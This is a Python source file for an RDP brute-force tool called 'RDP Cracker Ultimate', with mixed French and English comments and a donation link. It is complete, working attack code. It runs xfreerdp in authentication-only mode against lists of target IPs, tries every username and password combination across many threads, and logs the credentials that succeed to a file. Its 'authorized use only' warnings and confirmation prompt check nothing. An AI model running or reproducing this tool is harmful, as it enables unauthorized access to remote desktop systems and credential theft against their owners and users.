#!/usr/bin/env python3
"""
RDP CRACKER ULTIMATE - Version avec affichage de chaque combinaison
Affiche chaque test en temps réel avec résultat immédiat

⚠️  WARNING: This tool is for authorized penetration testing only!
    Use only on systems you have explicit permission to test.
"""

import subprocess
import sys
import threading
import time
import os
import argparse
import random
from queue import Queue, Empty

# Import des dépendances optionnelles avec fallback
try:
    import pyfiglet
    PYFIGLET_AVAILABLE = True
except ImportError:
    PYFIGLET_AVAILABLE = False
    print("⚠️  pyfiglet not installed. Using simple banner.")

try:
    from rich.console import Console
    from rich.panel import Panel
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("⚠️  rich not installed. Using simple output.")

# Initialisation de la console
if RICH_AVAILABLE:
    console = Console()
else:
    console = None

# === MODERN BANNER ===
def show_banner():
    """Affiche un banner stylé pour l'outil"""
    if RICH_AVAILABLE and PYFIGLET_AVAILABLE:
        try:
            banner = pyfiglet.figlet_format("RDP Cracking", font="slant")
            console.print(Panel.fit(
                f"[bold red]{banner}[/bold red]\n"
                f"[italic]                 Advanced RDP Cracking Tool     [/italic]\n"
                f"[bold green]<<<<<>>>>>   Support: https://ko-fi.com/xbro1   [/bold green]\n",
                border_style="red",
                subtitle="[bold yellow]  Made By X-Bro  [/bold yellow]"
            ))
        except:
            # Fallback si pyfiglet échoue
            show_simple_banner()
    else:
        show_simple_banner()

def show_simple_banner():
    """Banner de fallback si les dépendances ne sont pas disponibles"""
    print("=" * 60)
    print("            RDP CRACKER ULTIMATE")
    print("            Advanced RDP Cracking Tool")
    print("=" * 60)
    print("            Made By X-Bro")
    print("    Support: https://ko-fi.com/xbro1")
    print("=" * 60)

class RDPCrackerUltimate:
    def __init__(self, username_file=None, password_file=None, ips_file=None, 
                 max_threads=20, timeout=5, output_file=None, fixed_user=None,
                 batch_size=1000):
        
        self.username_file = username_file
        self.password_file = password_file
        self.ips_file = ips_file
        self.max_threads = max_threads
        self.timeout = timeout
        self.output_file = output_file
        self.fixed_user = fixed_user
        self.batch_size = batch_size
        
        self.found_credentials = []
        self.queue = Queue(maxsize=5000)
        self.attempts = 0
        self.success_count = 0
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.producer_finished = False
        
    def red_text(self, text):
        return f"\033[91m{text}\033[0m"
    
    def green_text(self, text):
        return f"\033[92m{text}\033[0m"
    
    def yellow_text(self, text):
        return f"\033[93m{text}\033[0m"
    
    def blue_text(self, text):
        return f"\033[94m{text}\033[0m"
    
    def load_file(self, file_path):
        """Charge un fichier ligne par ligne"""
        if not file_path or not os.path.exists(file_path):
            return []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"❌ Error loading file {file_path}: {e}")
            return []
    
    def load_file_generator(self, file_path):
        """Générateur pour charger les fichiers en mode paresseux"""
        if not file_path or not os.path.exists(file_path):
            return
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        yield line
        except Exception as e:
            print(f"❌ Error reading file {file_path}: {e}")
            return
    
    def check_dependencies(self):
        """Vérifie que les dépendances système sont installées"""
        # Vérifier si xfreerdp est installé
        try:
            subprocess.run(['xfreerdp', '/version'], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         timeout=2)
            return True
        except (subprocess.SubprocessError, FileNotFoundError):
            print("❌ xfreerdp is not installed or not in PATH")
            print("💡 Install it with: sudo apt install freerdp2-x11")
            return False
    
    def test_rdp_connection(self, ip, username, password):
        """Teste une seule connexion RDP avec xfreerdp"""
        try:
            cmd = [
                'timeout', str(self.timeout),
                'xfreerdp', 
                '/v:' + ip,
                '/u:' + username,
                '/p:' + password,
                '/cert:ignore',
                '/sec:nla',
                '/log-level:error',
                '+auth-only',
                '/connect-timeout:' + str(self.timeout * 1000)
            ]
            
            result = subprocess.run(
                cmd, 
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=self.timeout + 2
            )
            
            return result.returncode == 0
            
        except subprocess.TimeoutExpired:
            return False
        except Exception as e:
            print(f"⚠️  Connection test error for {ip}: {e}")
            return False
    
    def worker(self):
        """Worker qui teste les combinaisons et affiche chaque test"""
        while not self.stop_event.is_set() or not self.queue.empty():
            try:
                # Get combination from queue with timeout
                try:
                    ip, username, password = self.queue.get(timeout=1)
                except Empty:
                    if self.producer_finished:
                        break
                    continue
                
                with self.lock:
                    self.attempts += 1
                    current_attempt = self.attempts
                
                # Afficher CHAQUE tentative en cours
                print(f"🔍 Testing: {ip} - {username}:{password} (Attempt: {current_attempt})")
                
                # Test the connection
                success = self.test_rdp_connection(ip, username, password)
                
                if success:
                    with self.lock:
                        self.success_count += 1
                        result = f"{ip} - {username}:{password}"
                        self.found_credentials.append(result)
                    
                    # BOOM CRACKED ACCESS message
                    print("\n" + "="*60)
                    print(self.red_text("🔥 BOOM CRACKED ACCESS 🔥"))
                    print(self.red_text("🎯 ACCESS GRANTED !!!"))
                    print(self.red_text(f"✅ {result}"))
                    print("="*60 + "\n")
                    
                    # Save to file immediately
                    if self.output_file:
                        with open(self.output_file, 'a') as f:
                            f.write(result + '\n')
                else:
                    # Afficher chaque échec aussi
                    print(f"❌ Failed: {username}:{password} on {ip}")
                
                self.queue.task_done()
                time.sleep(0.1)  # Petit délai entre les tests
                
            except Exception as e:
                print(f"⚠️ Worker error: {e}")
                continue
    
    def producer(self):
        """Producteur qui génère les combinaisons par lots"""
        print("📦 Loading data in batches...")
        
        # Charger les IPs
        ips = self.load_file(self.ips_file)
        if not ips:
            print("❌ No IPs loaded")
            self.producer_finished = True
            return
        
        # Charger les users et passwords
        if self.fixed_user:
            usernames = [self.fixed_user]
            passwords = list(self.load_file_generator(self.password_file))
            if not passwords:
                print("❌ No passwords loaded")
                self.producer_finished = True
                return
        else:
            usernames = list(self.load_file_generator(self.username_file))
            passwords = list(self.load_file_generator(self.password_file))
            if not usernames or not passwords:
                print("❌ No users or passwords loaded")
                self.producer_finished = True
                return
        
        total_combinations = len(ips) * len(usernames) * len(passwords)
        print(f"📊 Total combinations: {total_combinations:,}")
        print(f"✅ IPs: {len(ips)} | Users: {len(usernames)} | Passwords: {len(passwords)}")
        print("🔄 Starting tests...\n")
        
        # Générer les combinaisons par lots
        batch_count = 0
        for ip in ips:
            if self.stop_event.is_set():
                break
                
            for username in usernames:
                if self.stop_event.is_set():
                    break
                    
                for password in passwords:
                    if self.stop_event.is_set():
                        break
                    
                    # Attendre si la file est trop pleine
                    while self.queue.qsize() > 4000 and not self.stop_event.is_set():
                        time.sleep(0.1)
                    
                    if not self.stop_event.is_set():
                        self.queue.put((ip, username, password))
                        batch_count += 1
                    
                    # Log de progression
                    if batch_count % 1000 == 0:
                        print(f"📦 Generated: {batch_count:,} combinations")
        
        self.producer_finished = True
        print("✅ All combinations generated")
    
    def start_cracking(self):
        """Démarre le processus de test"""
        # Afficher le banner au début
        show_banner()
        
        # Vérifier les dépendances
        if not self.check_dependencies():
            print("❌ Required dependencies are missing. Exiting.")
            return
        
        print("🚀 Starting RDP Cracker Ultimate...")
        print("👁️  Displaying EVERY combination test")
        print("⚠️  Only use on authorized systems!")
        print("-" * 50)
        
        # Démarrer le producteur dans un thread séparé
        producer_thread = threading.Thread(target=self.producer)
        producer_thread.daemon = True
        producer_thread.start()
        
        # Attendre que le producteur commence à remplir la file
        time.sleep(2)
        
        print(f"📋 Initial queue size: {self.queue.qsize()}")
        print("⏳ Starting worker threads...\n")
        
        # Démarrer les workers
        threads = []
        for i in range(self.max_threads):
            thread = threading.Thread(target=self.worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Surveillance de la progression
        try:
            start_time = time.time()
            last_update = start_time
            
            while (not self.producer_finished or not self.queue.empty()) and not self.stop_event.is_set():
                time.sleep(5)
                
                current_time = time.time()
                elapsed = current_time - start_time
                queue_size = self.queue.qsize()
                
                with self.lock:
                    attempts = self.attempts
                    successes = self.success_count
                
                if attempts > 0:
                    speed = attempts / elapsed
                    remaining = queue_size
                    eta = remaining / speed if speed > 0 else 0
                    
                    # Mettre à jour l'affichage toutes les 15 secondes
                    if current_time - last_update > 15:
                        print(f"\n📊 SUMMARY: {attempts:,} attempts | {queue_size:,} in queue | "
                              f"{successes} found | {speed:.1f} attempts/sec | "
                              f"ETA: {eta/60:.1f} min\n")
                        last_update = current_time
                
                # Vérifier si tous les workers sont bloqués
                if queue_size > 1000 and attempts == 0:
                    print("⚠️  Workers may be stuck, restarting...")
                    break
            
            # Attendre la fin
            self.queue.join()
            
        except KeyboardInterrupt:
            print("\n⏹️ Stopped by user")
        finally:
            self.stop_event.set()
            
            # Résultats finaux
            print("\n" + "="*50)
            print("🎯 FINAL RESULTS")
            print("="*50)
            print(f"Total attempts: {self.attempts:,}")
            print(f"Successful logins: {self.success_count}")
            
            if self.success_count > 0:
                print("\n🔥 CRACKED CREDENTIALS:")
                for cred in self.found_credentials:
                    print(f"   {self.green_text(cred)}")
            else:
                print("\n❌ No credentials found")
            
            if self.output_file and self.success_count > 0:
                print(f"\n💾 Results saved to: {self.output_file}")
            
            print(f"\n⏱️  Total time: {time.time() - start_time:.0f} seconds")
            
            # Afficher le message de support à la fin du scan
            print("\n" + "="*60)
            print("💖 If you find this tool useful, please consider supporting")
            print("   its development by buying a coffee for X-Bro:")
            print("   https://ko-fi.com/xbro1")
            print("="*60)

def display_help_examples():
    """Affiche des exemples d'utilisation"""
    print("\n📖 USAGE EXAMPLES:")
    print("  Basic usage with user list:")
    print("    python3 rdp_cracker.py -u users.txt -p passwords.txt -i ips.txt")
    print("")
    print("  Use fixed username (Administrator):")
    print("    python3 rdp_cracker.py -U Administrator -p passwords.txt -i ips.txt")
    print("")
    print("  With custom threads and output file:")
    print("    python3 rdp_cracker.py -U admin -p passwords.txt -i ips.txt -t 50 -o results.txt")
    print("")
    print("  Test with small timeout:")
    print("    python3 rdp_cracker.py -u users.txt -p passwords.txt -i ips.txt --timeout 3")

def main():
    parser = argparse.ArgumentParser(
        description="RDP Cracker Ultimate - Professional RDP penetration testing tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u users.txt -p passwords.txt -i ips.txt
  %(prog)s -U Administrator -p passwords.txt -i ips.txt -t 30 -o results.txt
        """
    )
    
    parser.add_argument("-u", "--users", help="File containing usernames (one per line)")
    parser.add_argument("-p", "--passwords", required=True, help="File containing passwords (one per line)")
    parser.add_argument("-i", "--ips", required=True, help="File containing target IPs (one per line)")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of threads (default: 20)")
    parser.add_argument("-T", "--timeout", type=int, default=5, help="Connection timeout in seconds (default: 5)")
    parser.add_argument("-o", "--output", help="Output file to save successful credentials")
    parser.add_argument("-U", "--fixed-user", help="Use a single fixed username (e.g., Administrator)")
    parser.add_argument("-b", "--batch", type=int, default=1000, help="Batch size for processing (default: 1000)")
    parser.add_argument("--examples", action="store_true", help="Show usage examples")
    
    args = parser.parse_args()
    
    if args.examples:
        display_help_examples()
        return
    
    # Validation des arguments
    if not args.fixed_user and not args.users:
        print("❌ Error: You must specify either --users or --fixed-user")
        print("💡 Use --help for usage information")
        return
    
    # Vérification des fichiers
    for file_type, file_path in [("passwords", args.passwords), ("IPs", args.ips)]:
        if not os.path.exists(file_path):
            print(f"❌ Error: {file_type} file '{file_path}' not found")
            return
    
    if args.users and not os.path.exists(args.users):
        print(f"❌ Error: Users file '{args.users}' not found")
        return
    
    # Avertissement de sécurité
    print("⚠️  WARNING: This tool is for authorized penetration testing only!")
    print("   Ensure you have explicit permission to test the target systems.")
    print("   Unauthorized use is illegal and unethical.")
    print("")
    
    confirm = input("✅ Confirm you have authorization (y/N): ")
    
    if confirm.lower() not in ['y', 'yes']:
        print("❌ Operation cancelled.")
        return
    
    # Démarrer le cracker
    cracker = RDPCrackerUltimate(
        username_file=args.users,
        password_file=args.passwords,
        ips_file=args.ips,
        max_threads=args.threads,
        timeout=args.timeout,
        output_file=args.output,
        fixed_user=args.fixed_user,
        batch_size=args.batch
    )
    
    cracker.start_cracking()

if __name__ == "__main__":
    main()
